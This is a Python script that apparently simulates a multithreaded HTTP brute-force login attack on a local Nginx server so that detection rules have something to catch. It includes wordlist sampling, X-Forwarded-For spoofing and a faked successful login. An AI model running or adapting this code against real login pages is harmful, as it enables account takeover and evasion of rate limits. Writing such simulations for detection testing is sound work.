import requests
import time
import argparse
import random
import os
from concurrent.futures import ThreadPoolExecutor

def send_brute_force_request(target_url, username, password, spoof_ip=None):
    """Sends a single login attempt."""
    try:
        # We simulate a POST request to a login endpoint
        data = {'username': username, 'password': password}
        
        # Using a suspicious User-Agent to trigger potential rules
        headers = {'User-Agent': 'Hydra/0.1 (Brute Force Tool)'}
        if spoof_ip:
            headers['X-Forwarded-For'] = spoof_ip
        
        # In a real app, 401/403 means failure, 200/302 means success.
        # Since Nginx doesn't have a /login endpoint by default, it will return 404.
        # To simulate a successful login for our detection rules, if the password is "correct_admin_password_123",
        # we will hit the root endpoint "/" which returns a 200 OK.
        if password == "correct_admin_password_123":
            target_url = target_url.replace("/login", "/")
            
        response = requests.post(target_url, data=data, headers=headers, timeout=5)
        
        print(f"[BRUTE-FORCE] Tried {username}:{password} | Status: {response.status_code} | Spoof IP: {spoof_ip}")
        
    except requests.exceptions.RequestException as e:
        print(f"[BRUTE-FORCE] Request failed: {e}")

def simulate_brute_force(target_url, username, password_list, threads, spoof_ip=None):
    """Simulates a rapid brute force attack using multiple threads."""
    print(f"Starting Brute Force Simulation against {target_url}")
    print(f"Target Username: {username}")
    print(f"Passwords to try: {len(password_list)}")
    print(f"Threads: {threads}")
    print("-" * 50)
    
    start_time = time.time()
    
    # Use ThreadPoolExecutor to send requests concurrently (rapid fire)
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for password in password_list:
            executor.submit(send_brute_force_request, target_url, username, password, spoof_ip)
            
    elapsed = time.time() - start_time
    print("-" * 50)
    print(f"Simulation complete. Sent {len(password_list)} requests in {elapsed:.2f} seconds.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate HTTP Brute Force Attack")
    parser.add_argument("--target", type=str, default="http://localhost:8080/login", help="Target URL")
    parser.add_argument("--user", type=str, default="admin", help="Username to brute force")
    parser.add_argument("--attempts", type=int, default=100, help="Number of passwords to try")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--success", type=lambda x: (str(x).lower() == 'true'), default=False, help="Whether to include a successful login at the end")
    parser.add_argument("--wordlist", type=str, default="passwords.txt", help="Path to the password wordlist file")
    parser.add_argument("--spoof-ip", type=str, default=None, help="Spoof X-Forwarded-For IP address")
    
    args = parser.parse_args()
    
    # Resolve wordlist path relative to this script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    wordlist_path = os.path.join(script_dir, args.wordlist)
    
    passwords = []
    if os.path.exists(wordlist_path):
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            # Read non-empty lines
            available_passwords = [line.strip() for line in f if line.strip()]
            
        if available_passwords:
            # Randomly sample passwords from the wordlist up to the number of attempts
            # If attempts > available passwords, we'll allow duplicates by using choices instead of sample
            if args.attempts <= len(available_passwords):
                passwords = random.sample(available_passwords, args.attempts)
            else:
                passwords = random.choices(available_passwords, k=args.attempts)
        else:
            print(f"Warning: Wordlist {wordlist_path} is empty. Falling back to generated passwords.")
    else:
        print(f"Warning: Wordlist {wordlist_path} not found. Falling back to generated passwords.")
        
    # Fallback if wordlist reading failed
    if not passwords:
        passwords = [f"password{i}" for i in range(args.attempts)]
    
    if args.success:
        # Append the "correct" password at the end
        passwords.append("correct_admin_password_123")
        
    # We must ensure the requests are sent sequentially if we want to guarantee
    # the successful login happens AFTER the failures. ThreadPoolExecutor can
    # execute them out of order.
    if args.success:
        # Force sequential execution if we need a specific order
        print("[*] Simulating failed attempts first...")
        simulate_brute_force(args.target, args.user, passwords[:-1], threads=1, spoof_ip=args.spoof_ip)
        
        print("[*] Waiting 3 seconds to ensure logs are processed in order...")
        time.sleep(3)
        
        print("[*] Simulating successful login...")
        simulate_brute_force(args.target, args.user, [passwords[-1]], threads=1, spoof_ip=args.spoof_ip)
    else:
        simulate_brute_force(args.target, args.user, passwords, args.threads, args.spoof_ip)